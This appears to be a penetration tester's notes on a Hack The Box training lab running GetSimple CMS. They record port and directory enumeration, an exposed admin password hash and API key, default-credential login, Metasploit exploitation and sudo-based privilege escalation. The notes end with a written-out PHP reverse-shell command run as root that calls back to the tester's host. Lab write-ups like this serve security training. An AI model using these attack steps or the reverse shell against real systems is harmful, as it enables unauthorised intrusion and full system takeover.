Current Target:
    10.129.169.191 (ACADEMY-GETSTART-SKILLS)

Basic Enumeration
    nmap -sV --open -oA kc_initial_scan 10.129.169.191
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 10:03 CST
        Nmap scan report for 10.129.169.191
        Host is up (0.011s latency).
        Not shown: 998 closed tcp ports (reset)
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds

    nmap -p- --open -oA kc_full_tcp_scan 10.129.169.191
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 10:04 CST
        Nmap scan report for 10.129.169.191
        Host is up (0.0095s latency).
        Not shown: 64209 closed tcp ports (reset), 1324 filtered tcp ports (no-response)
        Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
        PORT   STATE SERVICE
        22/tcp open  ssh
        80/tcp open  http

        Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds

    nmap -sC -p 22,80 -oA kc_script_scan 10.129.169.191
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 10:05 CST
        Nmap scan report for 10.129.169.191
        Host is up (0.0087s latency).

        PORT   STATE SERVICE
        22/tcp open  ssh
        | ssh-hostkey: 
        |   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
        |   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
        |_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
        80/tcp open  http
        | http-robots.txt: 1 disallowed entry 
        |_/admin/
        |_http-title: Welcome to GetSimple! - gettingstarted

        Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds

    nmap -sV --script=http-enum -oA kc_nmap_http_enum 10.129.169.191
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 10:06 CST
        Nmap scan report for 10.129.169.191
        Host is up (0.011s latency).
        Not shown: 998 closed tcp ports (reset)
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        | http-enum: 
        |   /admin/: Possible admin folder
        |   /admin/index.php: Possible admin folder
        |   /backups/: Backup folder w/ directory listing
        |   /robots.txt: Robots file
        |_  /data/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds

    nc -nv 10.129.169.191 22
        (UNKNOWN) [10.129.169.191] 22 (ssh) open
        SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1

    nc -nv 10.129.169.191 80
        (UNKNOWN) [10.129.169.191] 80 (http) open

    whatweb 10.129.169.191
        http://10.129.169.191 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.169.191], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]

    curl http://10.129.169.191
        standard HTB web Page

    Browsed with firefox
        standard HTB web Page

    gobuster dir -u http://10.129.169.191 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
        ===============================================================
        Gobuster v3.6
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://10.129.169.191
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.6
        [+] Timeout:                 10s
        ===============================================================
        Starting gobuster in directory enumeration mode
        ===============================================================
        /.hta                 (Status: 403) [Size: 279]
        /.htaccess            (Status: 403) [Size: 279]
        /.htpasswd            (Status: 403) [Size: 279]
        /admin                (Status: 301) [Size: 316] [--> http://10.129.169.191/admin/]
        /backups              (Status: 301) [Size: 318] [--> http://10.129.169.191/backups/]
        /data                 (Status: 301) [Size: 315] [--> http://10.129.169.191/data/]
        /index.php            (Status: 200) [Size: 5485]
        /plugins              (Status: 301) [Size: 318] [--> http://10.129.169.191/plugins/]
        /robots.txt           (Status: 200) [Size: 32]
        /server-status        (Status: 403) [Size: 279]
        /sitemap.xml          (Status: 200) [Size: 431]
        /theme                (Status: 301) [Size: 316] [--> http://10.129.169.191/theme/]
        Progress: 4723 / 4724 (99.98%)
        ===============================================================
        Finished
        ===============================================================

    curl http://10.129.169.191/sitemap.xml
        <?xml version="1.0" encoding="UTF-8"?>
        <urlset 
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
            xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd" 
            xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
            <url>
                <loc>http://gettingstarted.htb/</loc>
                <lastmod>2021-02-09T09:53:11+00:00</lastmod>
                <changefreq>weekly</changefreq>
                <priority>1.0</priority>
                </url>
            </urlset>

    curl http://10.129.169.191/robots.txt
        User-agent: *
        Disallow: /admin/

    Browsed http://10.129.169.191/theme/
        directory listing is enabled
        found cardinal and innovation theme folders

    Browsed http://10.129.169.191/plugins/
        Index of /plugins
        [ICO]	Name	Last modified	Size	Description
        [PARENTDIR]	Parent Directory	 	- 	 
        [ ]	InnovationPlugin.php	2018-09-07 17:58 	3.3K	 
        [DIR]	InnovationPlugin/	2024-03-12 13:05 	- 	 
        [ ]	anonymous_data.php	2018-09-07 17:58 	9.8K	 
        [DIR]	anonymous_data/	2024-03-12 13:05 	- 	 
        Apache/2.4.41 (Ubuntu) Server at 10.129.169.191 Port 80

    Browsed http://10.129.169.191/data/
            http://10.129.169.191/data/users/
            http://10.129.169.191/data/users/admin.xml

            <item>
                <USR>admin</USR>
                <NAME/>
                <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
                <EMAIL>admin@gettingstarted.com</EMAIL>
                <HTMLEDITOR>1</HTMLEDITOR>
                <TIMEZONE/>
                <LANG>en_US</LANG>
            </item>
    *** likely password hash ***
    d033e22ae348aeb5660fc2140aec35850c4da997 is a sha1 hash of "admin"

    http://10.129.169.191/data/other/authorization.xml
        <item>
            <apikey>4f399dc72ff8e619e327800f851e9986</apikey>
        </item>    

    http://10.129.169.191/data/uploads/
        empty

    browsed: http://10.129.169.191/admin/
        logged in with admin:admin credentials
        This is  GetSimple CMS install

    Browsed Plugins Page:
        Send Anonymous Data Version 1.0 active
        Innovation Theme Settings version 1.2 active

    started new listener for root access
            nc -lvnp 8123
    
    used metasploit unix/webapp/get_simple_cms_upload_exec
        upload failed

    used metasplot getsimplecms_unauth_code_exec
        succesfully got meterpeter running
        catted and submitted user flag
        shell allowed sudo -l which showed php can be run as root without password
        
        started nc listener for root connection: 
            nc -lvnp 8456

        sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.122",8456);exec("/bin/sh -i <&3 >&3 2>&3");'
            shell openned, catted root flag